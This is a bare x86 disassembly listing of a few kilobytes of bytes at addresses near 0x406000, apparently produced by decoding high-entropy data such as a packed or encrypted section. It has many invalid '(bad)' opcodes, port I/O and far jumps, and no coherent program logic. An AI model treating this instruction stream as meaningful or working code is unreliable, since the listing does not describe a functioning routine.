  405f41:	loopne 0x405f14
  405f43:	in     eax,0xfc
  405f45:	cmp    al,0xa8
  405f47:	xchg   ebp,eax
  405f48:	scas   al,BYTE PTR es:[edi]
  405f49:	fisubr DWORD PTR [ecx]
  405f4b:	clc    
  405f4c:	push   edx
  405f4d:	and    BYTE PTR [ebp+eiz*1-0x5c],al
  405f51:	sub    BYTE PTR [edi+edi*2-0x36],0xb
  405f56:	mov    cs,WORD PTR [edx+0x7e]
  405f59:	mov    al,ds:0xf990bd67
  405f5e:	jl     0x405f8b
  405f60:	cmc    
  405f61:	repnz mov edi,0xc34d2a18
  405f67:	ds jle 0x405f12
  405f6a:	shl    BYTE PTR [esi-0x27576406],0x67
  405f71:	rol    BYTE PTR [edx-0x24872ebf],cl
  405f77:	mov    al,0xb2
  405f79:	js     0x405fbc
  405f7b:	out    0x58,eax
  405f7d:	and    DWORD PTR [esp+esi*2-0x68],ecx
  405f81:	jp     0x405fb1
  405f83:	ins    BYTE PTR es:[edi],dx
  405f84:	pop    es
  405f85:	sbb    bl,ch
  405f87:	sbb    al,BYTE PTR [eax-0x7cfe1c47]
  405f8d:	stos   BYTE PTR es:[edi],al
  405f8e:	jl     0x405f5a
  405f90:	ss add al,0xc
  405f93:	add    eax,0x8d8102cf
  405f98:	mov    ebp,0xe8c0670e
  405f9d:	or     DWORD PTR [edi+0x67],0xffffffac
  405fa1:	pop    es
  405fa2:	fadd   st,st(1)
  405fa4:	fwait
  405fa5:	cld    
  405fa6:	cmp    ch,BYTE PTR [edx]
  405fa8:	push   edx
  405fa9:	mov    bh,BYTE PTR [eax+0x1a0fd3d3]
  405faf:	pop    ebx
  405fb0:	rol    DWORD PTR [ebp+ebx*2+0x3a],cl
  405fb4:	mov    eax,ds:0x68eea3ca
  405fb9:	inc    ebx
  405fba:	push   ss
  405fbb:	in     al,dx
  405fbc:	call   0xbcb7:0x39821036
  405fc3:	std    
  405fc4:	lahf   
  405fc5:	fcmovnb st,st(3)
  405fc7:	in     eax,dx
  405fc8:	inc    ecx
  405fc9:	push   edx
  405fca:	lods   eax,DWORD PTR ds:[esi]
  405fcb:	xor    eax,0x7ba15517
  405fd0:	dec    esp
  405fd1:	into   
  405fd2:	sub    eax,0xc77aa26e
  405fd7:	not    cl
  405fd9:	jno    0x406001
  405fdb:	ror    DWORD PTR [eax-0x54d9ddf6],0x98
  405fe2:	xchg   edi,eax
  405fe3:	jo     0x405fd1
  405fe5:	rcr    BYTE PTR [esi-0x7440c67c],0x72
  405fec:	mov    eax,0x52bebab1
  405ff1:	push   ecx
  405ff2:	aas    
  405ff3:	jp     0x405ff6
  405ff5:	aam    0x64
  405ff7:	es ret 
  405ff9:	sbb    cl,BYTE PTR [esp+esi*2]
  405ffc:	jg     0x405fdb
  405ffe:	(bad)  
  405fff:	push   esi
  406000:	push   esp
  406001:	(bad)  
  406002:	mov    ah,0xa1
  406004:	jmp    0x7364:0x6ff55935
  40600b:	stos   DWORD PTR es:[edi],eax
  40600c:	sub    BYTE PTR [esi],dh
  40600e:	dec    ebp
  40600f:	xchg   ebx,eax
  406010:	mov    es,ebp
  406012:	mov    dx,0xca92
  406016:	jb     0x405f9e
  406018:	xchg   ebp,eax
  406019:	or     dh,ch
  40601b:	push   esp
  40601c:	jb     0x405ffe
  40601e:	inc    edx
  40601f:	xor    al,0x3e
  406021:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406022:	jae    0x405ffc
  406024:	add    al,0x67
  406026:	xor    BYTE PTR [eax],al
  406028:	out    dx,al
  406029:	rcl    BYTE PTR [esi-0x76],cl
  40602c:	mov    ebp,0x21b4ad82
  406031:	inc    esp
  406032:	gs inc edi
  406034:	xchg   ebx,eax
  406035:	xchg   edi,eax
  406036:	sub    esi,DWORD PTR [eax+0x33]
  406039:	daa    
  40603a:	out    dx,eax
  40603b:	fild   QWORD PTR [ebx-0x3f]
  40603e:	mov    edi,DWORD PTR [esi+0x681a76b9]
  406044:	xchg   esp,eax
  406045:	popf   
  406046:	ins    DWORD PTR es:[edi],dx
  406047:	dec    eax
  406048:	adc    BYTE PTR [ebp+eiz*1+0x75],0xf4
  40604d:	jbe    0x4060b8
  40604f:	lea    esp,[ecx+0xe1ef06c]
  406055:	xchg   esp,eax
  406056:	(bad)  
  406057:	outs   dx,DWORD PTR ds:[esi]
  406058:	dec    edx
  406059:	mov    al,ds:0x1c9b3867
  40605e:	inc    edi
  40605f:	and    DWORD PTR [eax+ebx*4+0x32],0xffffffcc
  406064:	pop    ecx
  406065:	dec    ebx
  406066:	pop    ebp
  406067:	mov    esp,0x4f6dd43b
  40606c:	or     dl,0x70
  40606f:	xchg   ebp,eax
  406070:	adc    BYTE PTR [esi-0x28],dl
  406073:	jecxz  0x406082
  406075:	mov    dl,0x84
  406077:	jne    0x4060ea
  406079:	mov    WORD PTR [edx],ss
  40607b:	jnp    0x4060f0
  40607d:	repz ja 0x4060ae
  406080:	push   es
  406081:	jno    0x4060c4
  406083:	xchg   ebx,eax
  406084:	stos   DWORD PTR es:[di],eax
  406086:	xchg   ebx,eax
  406087:	inc    esp
  406088:	add    ebp,DWORD PTR [edi+0x41]
  40608b:	ds mov al,cs:0x1f011a0
  406092:	(bad)  
  406093:	bound  ebp,QWORD PTR [ebp+0x15]
  406096:	add    ebx,DWORD PTR [esi+0x55]
  406099:	xchg   ecx,eax
  40609a:	div    DWORD PTR [ecx+0x7a7525fb]
  4060a0:	ds xchg ebx,eax
  4060a2:	into   
  4060a3:	test   ebp,ebp
  4060a5:	mov    eax,ds:0xbc336fda
  4060aa:	fld    TBYTE PTR [edi-0x35]
  4060ad:	lds    edx,FWORD PTR [edx]
  4060af:	and    al,0xbc
  4060b1:	repz mov dl,0x14
  4060b4:	adc    BYTE PTR [ebp+0x44],ch
  4060b7:	add    al,0x71
  4060b9:	data16 sar BYTE PTR [ecx+esi*2-0x6f],cl
  4060be:	aam    0xb1
  4060c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060c1:	mov    eax,0x214fe694
  4060c6:	stos   BYTE PTR es:[edi],al
  4060c7:	push   0xbe26c3a2
  4060cc:	inc    bp
  4060ce:	pop    ds
  4060cf:	dec    eax
  4060d0:	loope  0x40610a
  4060d2:	and    edx,DWORD PTR [ebx-0x462a7e27]
  4060d8:	ins    DWORD PTR es:[edi],dx
  4060d9:	mov    ecx,edi
  4060db:	ror    DWORD PTR [edx+esi*2+0x438a470d],0xc6
  4060e3:	call   0x4c44:0xbd1ce5c8
  4060ea:	arpl   WORD PTR [ecx],ax
  4060ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060ed:	cs inc edx
  4060ef:	xor    ecx,DWORD PTR [ebp+edi*4-0x10106040]
  4060f6:	outs   dx,BYTE PTR ds:[esi]
  4060f7:	sub    ebp,esp
  4060f9:	cdq    
  4060fa:	cwde   
  4060fb:	call   0x12c2:0x3fff9c74
  406102:	jge    0x406150
  406104:	test   BYTE PTR [ecx],bh
  406106:	adc    edx,ebx
  406108:	fxtract 
  40610a:	int3   
  40610b:	mov    eax,0x13441584
  406110:	(bad)  
  406111:	jns    0x406102
  406113:	ds sub eax,0xccfc9350
  406119:	daa    
  40611a:	fmul   DWORD PTR [edx]
  40611c:	cld    
  40611d:	and    BYTE PTR [ebp+0x582d611],0x15
  406124:	mov    edi,0xbdc0756e
  406129:	or     dl,0xc4
  40612c:	jl     0x406149
  40612e:	jg     0x406116
  406130:	jne    0x4061a2
  406132:	jp     0x406163
  406134:	xchg   BYTE PTR [ecx+0x57],bh
  406137:	mov    dh,0x44
  406139:	inc    esi
  40613a:	ss jns 0x406145
  40613d:	push   es
  40613e:	inc    eax
  40613f:	mov    dl,0x15
  406141:	ss mov ebp,0x69b5f799
  406147:	fs (bad) 
  406149:	xchg   ebp,eax
  40614a:	jge    0x4060ea
  40614c:	aad    0x34
  40614e:	mov    edx,0xfcdcea7c
  406153:	jae    0x406124
  406155:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406156:	cmp    BYTE PTR [esi-0x63764b7a],dh
  40615c:	mov    cs,esi
  40615e:	add    BYTE PTR [eax],0xb5
  406161:	ret    
  406162:	mov    cs,esp
  406164:	adc    ch,ah
  406166:	inc    ebx
  406167:	je     0x40611a
  406169:	arpl   WORD PTR [ebp-0x22003486],cx
  40616f:	in     al,dx
  406170:	neg    ebx
  406172:	ja     0x40611c
  406174:	outs   dx,BYTE PTR ds:[esi]
  406175:	(bad)  
  406176:	rcl    ecx,0x91
  406179:	mov    ecx,0x602d4b6f
  40617e:	(bad)  
  40617f:	hlt    
  406180:	int3   
  406181:	cdq    
  406182:	cmp    bl,ch
  406184:	push   0xffffffd2
  406186:	sahf   
  406187:	retf   
  406188:	aad    0xdf
  40618a:	pushf  
  40618b:	xlat   BYTE PTR fs:[ebx]
  40618d:	adc    eax,0x6890db55
  406192:	and    edx,ebp
  406194:	test   al,0x88
  406196:	push   ds
  406197:	dec    esi
  406198:	push   edi
  406199:	adc    BYTE PTR [eax-0x27],bh
  40619c:	shl    BYTE PTR [edi-0x18],cl
  40619f:	sbb    ah,BYTE PTR [edi]
  4061a1:	or     DWORD PTR [ebp-0x614ccbf1],edi
  4061a7:	cmc    
  4061a8:	dec    edx
  4061a9:	leave  
  4061aa:	or     BYTE PTR [edx+0x736f4252],cl
  4061b0:	popa   
  4061b1:	xor    al,0x9c
  4061b3:	push   0xffffffb3
  4061b5:	xchg   esp,eax
  4061b6:	sbb    BYTE PTR [ebx],al
  4061b8:	add    eax,0x6eb8f225
  4061bd:	push   0x184b7504
  4061c2:	aas    
  4061c3:	inc    ebx
  4061c4:	push   ebp
  4061c5:	pop    esp
  4061c6:	jg     0x4061a8
  4061c8:	add    bl,0x9a
  4061cb:	mov    ebx,0x94a2d8d8
  4061d0:	mov    cs,edx
  4061d2:	push   esi
  4061d3:	outs   dx,BYTE PTR ds:[esi]
  4061d4:	dec    edi
  4061d5:	fistp  WORD PTR [ebx-0x5efe9a0f]
  4061db:	inc    esi
  4061dc:	fs repnz fwait
  4061df:	imul   ecx,DWORD PTR [edx+0x0],0xf07f463f
  4061e6:	stos   BYTE PTR es:[edi],al
  4061e7:	adc    BYTE PTR [edx+0x3be4bd11],0xef
  4061ee:	lods   ax,WORD PTR ds:[esi]
  4061f0:	and    DWORD PTR [ebx-0x7eee07c9],ebp
  4061f6:	pushf  
  4061f7:	mov    esi,0xeb4d5dfe
  4061fc:	(bad)  
  4061fe:	pop    edi
  4061ff:	pusha  
  406200:	dec    ebp
  406201:	xchg   ebp,eax
  406202:	das    
  406203:	cmp    BYTE PTR [ebp+0x7897e8a4],ah
  406209:	cwde   
  40620a:	push   esp
  40620b:	scas   al,BYTE PTR es:[edi]
  40620c:	aas    
  40620d:	push   ds
  40620e:	push   eax
  40620f:	rcl    BYTE PTR [ecx],cl
  406211:	test   eax,0x7ab1204c
  406216:	mov    edi,0xadfb1075
  40621b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40621c:	pop    esi
  40621d:	pop    esp
  40621e:	push   0x13
  406220:	xor    al,0x65
  406222:	or     al,0x6
  406224:	mov    ch,0xed
  406226:	jmp    FWORD PTR [edi]
  406228:	push   0x2f288aaa
  40622d:	fs pushf 
  40622f:	inc    ebp
  406230:	outs   dx,BYTE PTR ds:[esi]
  406231:	pop    edx
  406232:	pusha  
  406233:	sti    
  406234:	(bad)  
  406235:	stos   DWORD PTR es:[edi],eax
  406236:	je     0x4061ec
  406238:	dec    esi
  406239:	push   ds
  40623a:	cmp    eax,0xb8b796bb
  40623f:	or     eax,0x307ddfac
  406244:	pop    ecx
  406245:	inc    ebp
  406246:	adc    ecx,eax
  406248:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406249:	daa    
  40624a:	and    BYTE PTR [edx-0x42],ch
  40624d:	ds in  al,dx
  40624f:	or     DWORD PTR [ebx-0x7314cd4a],edx
  406255:	inc    edx
  406256:	or     bh,bl
  406258:	cld    
  406259:	mov    ch,0xec
  40625b:	in     al,0x97
  40625d:	ret    
  40625e:	mov    ecx,0x918914a1
  406263:	stos   BYTE PTR es:[edi],al
  406264:	iret   
  406265:	xchg   esp,eax
  406266:	jo     0x406252
  406268:	and    edx,DWORD PTR [ebx-0x43c4ac68]
  40626e:	and    al,0xa9
  406270:	pop    esp
  406271:	dec    ebp
  406272:	js     0x4062a4
  406274:	loopne 0x4062c6
  406276:	mov    ah,0x9
  406278:	xor    DWORD PTR [ebx],edi
  40627a:	jne    0x40620a
  40627c:	sub    DWORD PTR ds:0x9334d90c,0x22
  406283:	xlat   BYTE PTR ds:[ebx]
  406285:	xor    al,al
  406287:	addr16 push edx
  406289:	adc    DWORD PTR [eax-0x66],edx
  40628c:	cmp    eax,0x9d20d368
  406291:	popf   
  406292:	jns    0x406286
  406294:	xchg   ebp,eax
  406295:	loop   0x406269
  406297:	scas   eax,DWORD PTR es:[edi]
  406298:	sub    bl,ch
  40629a:	xlat   BYTE PTR ds:[ebx]
  40629b:	adc    DWORD PTR [ebx+0x3da0172a],ecx
  4062a1:	adc    dl,BYTE PTR [esi]
  4062a3:	sbb    al,0xf4
  4062a5:	dec    ebp
  4062a6:	xchg   esi,eax
  4062a7:	les    edx,FWORD PTR [esi+0x2b]
  4062aa:	push   esp
  4062ab:	add    eax,0x34577d33
  4062b0:	push   edx
  4062b1:	inc    ebx
  4062b2:	jle    0x4062e4
  4062b4:	(bad)  
  4062b5:	addr16 inc eax
  4062b7:	hlt    
  4062b8:	(bad)  
  4062b9:	jg     0x4062e6
  4062bb:	ss dec ecx
  4062bd:	cdq    
  4062be:	dec    ecx
  4062bf:	xchg   ecx,eax
  4062c0:	cld    
  4062c1:	enter  0x22f6,0x43
  4062c5:	lds    ecx,FWORD PTR [edi]
  4062c7:	cwde   
  4062c8:	jb     0x406270
  4062ca:	mov    cl,dl
  4062cc:	hlt    
  4062cd:	push   dx
  4062cf:	fild   DWORD PTR [esi-0x77]
  4062d2:	test   eax,0xdc7da500
  4062d7:	inc    esi
  4062d8:	jecxz  0x40627f
  4062da:	or     BYTE PTR [edx],al
  4062dc:	mov    esi,0x318ebda6
  4062e1:	push   0x2ea44c81
  4062e6:	inc    ebp
  4062e7:	or     al,0xf2
  4062e9:	arpl   WORD PTR [edx+ebp*8+0x753f26e7],sp
  4062f0:	and    BYTE PTR [ecx+edx*4-0xc],0x38
  4062f5:	out    dx,eax
  4062f6:	xor    BYTE PTR [ebp+0x21],al
  4062f9:	and    al,0xdc
  4062fb:	mov    ch,BYTE PTR [ebx+0x33db92dd]
  406301:	popa   
  406302:	int3   
  406303:	push   edi
  406304:	cs push ds
  406306:	fist   DWORD PTR [esi]
  406308:	cwde   
  406309:	fs call 0x78de:0xca986d6f
  406311:	dec    esi
  406312:	inc    ecx
  406313:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406314:	iret   
  406315:	rol    DWORD PTR [ebx],0x1a
  406318:	inc    ebx
  406319:	mov    ebp,0x598b51a2
  40631e:	cmp    BYTE PTR [ecx],0xd2
  406321:	mov    edx,0xc8d40181
  406326:	stc    
  406327:	sbb    DWORD PTR [ebx-0x3d],ecx
  40632a:	add    eax,edx
  40632c:	loopne 0x4062b9
  40632e:	cdq    
  40632f:	in     al,0x1c
  406331:	ret    
  406332:	xor    dl,BYTE PTR [eax-0x120f9e5e]
  406338:	xchg   edx,eax
  406339:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40633a:	out    dx,al
  40633b:	jbe    0x406325
  40633d:	enter  0x1bbd,0xba
  406341:	adc    eax,0xabd97c98
  406346:	mov    eax,0xef79c236
  40634b:	das    
  40634c:	cmp    al,0xee
  40634e:	imul   esp,DWORD PTR [ecx-0x23],0xe052b86c
  406355:	icebp  
  406356:	add    DWORD PTR [ecx+0x4260dfaf],ecx
  40635c:	or     edi,eax
  40635e:	cmp    esi,DWORD PTR [esi+0x4d]
  406361:	sti    
  406362:	add    ah,BYTE PTR [esi-0x38]
  406365:	clc    
  406366:	call   ebp
  406368:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406369:	ins    BYTE PTR es:[edi],dx
  40636a:	call   0xb76645e6
  40636f:	bound  edi,QWORD PTR [ebx]
  406371:	adc    eax,0x95dc0e16
  406376:	inc    edx
  406377:	ret    0x756a
  40637a:	dec    eax
  40637b:	mov    cs,WORD PTR [ecx]
  40637d:	jp     0x4063fa
  40637f:	stos   DWORD PTR es:[edi],eax
  406380:	or     cl,BYTE PTR [esi]
  406382:	lock cmp al,0xfe
  406385:	sbb    edi,DWORD PTR [ebx]
  406387:	cmp    DWORD PTR [esi-0x449a78e1],edx
  40638d:	xchg   esi,eax
  40638e:	dec    ebx
  40638f:	xlat   BYTE PTR ds:[ebx]
  406390:	cld    
  406391:	add    BYTE PTR [esi-0x6e9637c8],0x28
  406398:	je     0x40633a
  40639a:	dec    esp
  40639b:	jne    0x40631f
  40639d:	or     DWORD PTR [eax],ebp
  40639f:	dec    edi
  4063a0:	je     0x406348
  4063a2:	fstp   st(5)
  4063a4:	xor    DWORD PTR [esi],edi
  4063a6:	(bad)  [ecx+0x2a20f38e]
  4063ac:	popf   
  4063ad:	mov    cl,bh
  4063af:	psubb  mm1,mm7
  4063b2:	xor    BYTE PTR [ebx+0x74],0x4a
  4063b6:	xlat   BYTE PTR ds:[ebx]
  4063b7:	or     DWORD PTR [ebx],0x217b1ef0
  4063bd:	mov    WORD PTR ds:0xf432c913,?
  4063c3:	outs   dx,DWORD PTR ds:[esi]
  4063c4:	daa    
  4063c5:	push   edx
  4063c6:	cs jp  0x4063d5
  4063c9:	and    DWORD PTR [edi],ebx
  4063cb:	and    BYTE PTR [edi+0x1f639e23],0xa1
  4063d2:	sub    al,0x1f
  4063d4:	fld    TBYTE PTR [eax]
  4063d6:	repz mov eax,0xa54e8b7a
  4063dc:	aad    0xd8
  4063de:	pop    eax
  4063df:	in     al,dx
  4063e0:	push   ss
  4063e1:	pop    edi
  4063e2:	js     0x40642b
  4063e4:	repz out dx,eax
  4063e6:	ja     0x4063e1
  4063e8:	sbb    eax,0xe5c867e5
  4063ed:	or     BYTE PTR [eax-0x6d1cad8f],bl
  4063f3:	mov    ch,0x7f
  4063f5:	or     ah,BYTE PTR [eax-0x487702b5]
  4063fb:	(bad)  
  4063fc:	sbb    ah,BYTE PTR ds:0xbe318a25
  406402:	inc    ecx
  406403:	loop   0x4063cb
  406405:	mov    WORD PTR ds:0x105cd8c7,ds
  40640b:	add    dh,al
  40640d:	or     dl,BYTE PTR [ebx+0x77fee09f]
  406413:	mov    edi,0xf3e2ff66
  406418:	jl     0x406469
  40641a:	inc    esi
  40641b:	fimul  DWORD PTR [esi+ebp*2-0x46ab1c6b]
  406422:	aaa    
  406423:	dec    eax
  406424:	mov    ebp,0xbf839594
  406429:	call   0xad87fa82
  40642e:	jo     0x406447
  406430:	or     al,0x84
  406432:	rol    ecx,1
  406434:	xor    DWORD PTR [esi-0x737d67aa],esp
  40643a:	test   DWORD PTR [edi-0x6d],eax
  40643d:	lds    edi,FWORD PTR [edx+0x3f1a501]
  406443:	cwde   
  406444:	cmp    DWORD PTR [edi+0x6f1a8236],ecx
  40644a:	inc    eax
  40644b:	cmp    al,0x69
  40644d:	shl    esp,0x1d
  406450:	cmp    al,0x34
  406452:	(bad)  
  406453:	sti    
  406454:	mov    edi,0x1f3a9032
  406459:	pop    ebp
  40645a:	outs   dx,BYTE PTR ds:[esi]
  40645b:	jg     0x4063fa
  40645d:	aaa    
  40645e:	mov    WORD PTR [esi],es
  406460:	iret   
  406461:	aad    0xda
  406463:	xchg   eax,ecx
  406465:	dec    ebx
  406466:	push   eax
  406467:	scas   al,BYTE PTR es:[edi]
  406468:	jle    0x406432
  40646a:	adc    DWORD PTR [ecx-0x43da1480],0xe17f9c4c
  406474:	popa   
  406475:	std    
  406476:	imul   ecx,DWORD PTR [edx-0x16],0x30
  40647a:	or     DWORD PTR [esi+0x3],edx
  40647d:	std    
  40647e:	sub    BYTE PTR [edi+edx*1+0x4373f2a6],bh
  406485:	mov    ebp,0x4e35218e
  40648a:	test   DWORD PTR [esp+edx*4+0x21],ebp
  40648e:	pushf  
  40648f:	fstp   st(2)
  406491:	loop   0x40645c
  406493:	pop    esi
  406494:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406495:	inc    esp
  406496:	sbb    ebp,DWORD PTR [eax+0x1a]
  406499:	adc    ecx,esp
  40649b:	loop   0x4064ad
  40649d:	fmul   QWORD PTR [ebx-0x2f]
  4064a0:	jno    0x40644f
  4064a2:	mov    ebp,0xaf13590b
  4064a7:	loope  0x4064a4
  4064a9:	mov    ecx,0x8d0bf42f
  4064ae:	int    0xef
  4064b0:	push   ss
  4064b1:	add    DWORD PTR [esi+0x47c63f15],0xffffffb0
  4064b8:	int3   
  4064b9:	arpl   WORD PTR [esi-0xa],ax
  4064bc:	push   es
  4064bd:	ins    BYTE PTR es:[edi],dx
  4064be:	call   DWORD PTR [esi-0x784c2443]
  4064c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064c5:	or     ecx,DWORD PTR [ebp+0x238e47b7]
  4064cb:	ret    0x6d14
  4064ce:	xchg   esp,eax
  4064cf:	xor    al,0x2b
  4064d1:	sbb    DWORD PTR [edi+0x75dab5e7],0x39
  4064d8:	out    dx,al
  4064d9:	rcl    ebp,cl
  4064db:	sub    ebx,DWORD PTR [eax]
  4064dd:	dec    ebx
  4064de:	addr16 dec esi
  4064e0:	hlt    
  4064e1:	jle    0x406518
  4064e3:	jle    0x4064eb
  4064e5:	xlat   BYTE PTR ds:[ebx]
  4064e6:	test   al,0x40
  4064e8:	lods   eax,DWORD PTR ds:[esi]
  4064e9:	mov    dh,0x44
  4064eb:	or     ebp,DWORD PTR [ebx-0x468e47c5]
  4064f1:	pop    ss
  4064f2:	js     0x4064a4
  4064f4:	in     eax,dx
  4064f5:	adc    eax,0x3ea0d792
  4064fa:	loope  0x40654a
  4064fc:	je     0x4064cd
  4064fe:	inc    esi
  4064ff:	xchg   edx,eax
  406500:	jbe    0x406580
  406502:	retf   0x9308
  406505:	dec    esp
  406506:	xchg   edi,esp
  406508:	imul   esp,DWORD PTR [ebx-0x16],0x4c6fc6fc
  40650f:	aam    0x38
  406511:	jno    0x406550
  406513:	clc    
  406514:	sti    
  406515:	(bad)  
  406516:	mov    ah,al
  406518:	xcrypt-cbc (bad)
  406519:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40651a:	adc    bl,ah
  40651c:	jmp    0xbb24:0xe69ca2f6
  406523:	push   ebp
  406524:	jmp    0x8693:0xeecd3739
  40652b:	xchg   DWORD PTR [esi],esi
  40652d:	add    DWORD PTR [ecx+edi*8],edx
  406530:	fst    QWORD PTR ds:0x12e0c6ea
  406536:	sub    DWORD PTR [ecx],ebp
  406538:	fwait
  406539:	aam    0x5c
  40653b:	(bad)  
  40653c:	dec    esp
  40653d:	jmp    0x3243322d
  406542:	sbb    al,0xff
  406544:	aam    0x6e
  406546:	xor    ah,0x93
  406549:	iret   
  40654a:	dec    ecx
  40654b:	mov    al,0x85
  40654d:	mov    eax,ds:0xea703977
  406552:	ja     0x40653d
  406554:	xchg   BYTE PTR ds:[edx-0xad8258a],bl
  40655b:	adc    edi,DWORD PTR [esi+edx*1]
  40655e:	inc    eax
  40655f:	add    DWORD PTR [ecx-0x15acd6a3],edx
  406565:	ins    DWORD PTR es:[edi],dx
  406566:	xchg   BYTE PTR [edx+esi*2],ch
  406569:	test   BYTE PTR [ebp+0x49770d],ch
  40656f:	or     al,0x9a
  406571:	adc    al,0x4d
  406573:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406574:	xchg   BYTE PTR [esi+esi*4],cl
  406577:	or     eax,eax
  406579:	mov    esi,0xf4c9ab99
  40657e:	xchg   edi,eax
  40657f:	push   edx
  406580:	and    dl,BYTE PTR [ecx+0xe]
  406583:	xor    BYTE PTR [ecx-0x2],dh
  406586:	mov    bl,BYTE PTR [ebp-0xe]
  406589:	rcl    ebp,1
  40658b:	mov    esp,0x5a0a0727
  406590:	cmp    ebp,DWORD PTR [eax-0x27]
  406593:	scas   al,BYTE PTR es:[edi]
  406594:	inc    ecx
  406595:	out    dx,eax
  406596:	ds mov cl,0x57
  406599:	xchg   esi,eax
  40659a:	and    ah,0x48
  40659d:	test   DWORD PTR ds:0xce511b1a,ebx
  4065a3:	das    
  4065a4:	ret    
  4065a5:	(bad)  
  4065a6:	or     bl,BYTE PTR [ebp+0x77c199eb]
  4065ac:	add    BYTE PTR [ecx+0x5c],bh
  4065af:	jno    0x40655b
  4065b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065b2:	(bad)  
  4065b3:	mov    ecx,0xcbf0f1
  4065b8:	call   0xc337:0xd1d80013
  4065bf:	xor    ah,dl
  4065c1:	adc    ecx,0x15
  4065c4:	fisttp QWORD PTR [esi+0x46]
  4065c7:	xor    esi,DWORD PTR [edi-0x38]
  4065ca:	cmp    ebp,DWORD PTR [eax-0x2]
  4065cd:	sbb    al,0xeb
  4065cf:	cld    
  4065d0:	cmp    al,0x9c
  4065d2:	mov    ah,0xbb
  4065d4:	aad    0x99
  4065d6:	rcl    DWORD PTR [edi+esi*2],0x59
  4065da:	jo     0x406586
  4065dc:	test   al,0x38
  4065de:	test   al,0xef
  4065e0:	out    dx,al
  4065e1:	addr16 pop esp
  4065e3:	pop    ds
  4065e4:	xchg   edi,eax
  4065e5:	mov    eax,ds:0xd229fd14
  4065ea:	push   cs
  4065eb:	test   BYTE PTR [ebx+eiz*2],ah
  4065ee:	outs   dx,BYTE PTR ds:[esi]
  4065ef:	mov    ebp,0x611cd62
  4065f4:	sub    DWORD PTR [ecx-0x2a],ecx
  4065f7:	and    DWORD PTR [ecx-0x42],0xffffff85
  4065fb:	(bad)  
  4065fc:	push   ebp
  4065fd:	cwde   
  4065fe:	js     0x406655
  406600:	add    eax,0xe2bcc931
  406605:	addpd  xmm4,XMMWORD PTR [ecx-0x1fdac04e]
  40660d:	pop    es
  40660e:	xor    edx,DWORD PTR ds:0x7fc2dfc
  406614:	jl     0x4065ff
  406616:	aaa    
  406617:	lods   eax,DWORD PTR ds:[esi]
  406618:	pop    edx
  406619:	loopne 0x406604
  40661b:	mov    dl,0xf1
  40661d:	add    eax,DWORD PTR [ecx+0x58]
  406620:	sub    eax,0x8f27c12b
  406625:	sbb    al,0x5f
  406627:	xor    BYTE PTR [edi+ebx*4-0x1feed0d1],bh
  40662e:	adc    BYTE PTR [edi+0x18],dl
  406631:	loopne 0x406660
  406633:	bound  edi,QWORD PTR [esi+0x17]
  406636:	add    ebp,edi
  406638:	pop    es
  406639:	call   0x7164:0x861f955
  406640:	or     dl,0x43
  406643:	adc    ah,dl
  406645:	call   DWORD PTR [ebp+0x14]
  406648:	test   al,0x55
  40664a:	(bad)  
  40664b:	out    0x98,al
  40664d:	aaa    
  40664e:	aam    0x27
  406650:	and    BYTE PTR [ebx],0xe6
  406653:	(bad)  
  406654:	pop    ss
  406655:	inc    ecx
  406656:	push   ds
  406657:	aam    0xe6
  406659:	mov    al,ds:0x8ac503dd
  40665e:	sbb    dh,BYTE PTR [eax+0x424c811c]
  406664:	outs   dx,BYTE PTR ds:[esi]
  406665:	jle    0x4065f8
  406667:	sbb    dl,al
  406669:	adc    al,0x1f
  40666b:	ins    DWORD PTR es:[edi],dx
  40666c:	jl     0x40660f
  40666e:	rcl    BYTE PTR [eax+edx*8],cl
  406671:	dec    esp
  406672:	jns    0x406602
  406674:	out    0x7e,eax
  406676:	inc    ebx
  406677:	bnd ja 0x4066c7
  40667a:	ins    BYTE PTR es:[edi],dx
  40667b:	dec    ebp
  40667c:	add    al,0x5e
  40667e:	frstpm(287 only) 
  406680:	icebp  
  406681:	ret    0x53bc
  406684:	dec    ebp
  406685:	sbb    ah,cl
  406687:	sbb    esp,esi
  406689:	loop   0x406668
  40668b:	aas    
  40668c:	(bad)  
  40668d:	add    ah,BYTE PTR [ecx-0x151e83f0]
  406693:	and    DWORD PTR [eax+0x2886b36],esp
  406699:	mov    bh,0xfe
  40669b:	pop    ebx
  40669c:	mov    BYTE PTR [esi],dh
  40669e:	mov    ah,0xe4
  4066a0:	push   esi
  4066a1:	mov    esi,0x9bdf4a70
  4066a6:	loop   0x4066b8
  4066a8:	push   ds
  4066a9:	ins    DWORD PTR es:[edi],dx
  4066aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066ab:	xor    DWORD PTR [ebp-0xb],ebx
  4066ae:	push   eax
  4066af:	pop    esp
  4066b0:	ror    DWORD PTR [eax],1
  4066b2:	lock jno 0x406693
  4066b5:	clc    
  4066b6:	sbb    ebx,DWORD PTR [esi]
  4066b8:	(bad)  
  4066b9:	mov    ecx,0x1fd859ab
  4066be:	hlt    
  4066bf:	stc    
  4066c0:	lock cmp BYTE PTR [ecx-0x7b],dl
  4066c4:	push   0x814a37fe
  4066c9:	pop    ss
  4066ca:	cli    
  4066cb:	addr16 mov ecx,0x2162f0a2
  4066d1:	or     eax,0x20e7e498
  4066d6:	mov    ds:0xb7845d4,al
  4066db:	add    DWORD PTR [edx+0x4dc90b02],0x8e9704d8
  4066e5:	dec    ebp
  4066e6:	fdiv   DWORD PTR [ecx+ecx*1]
  4066e9:	xchg   DWORD PTR [eax],ecx
  4066eb:	sub    BYTE PTR [edx],0x14
  4066ee:	jae    0x4066cf
  4066f0:	fidiv  WORD PTR [ebx]
  4066f2:	fisubr DWORD PTR [edx-0x6c]
  4066f5:	pop    ds
  4066f6:	mov    eax,ds:0x4ecfe721
  4066fb:	cwde   
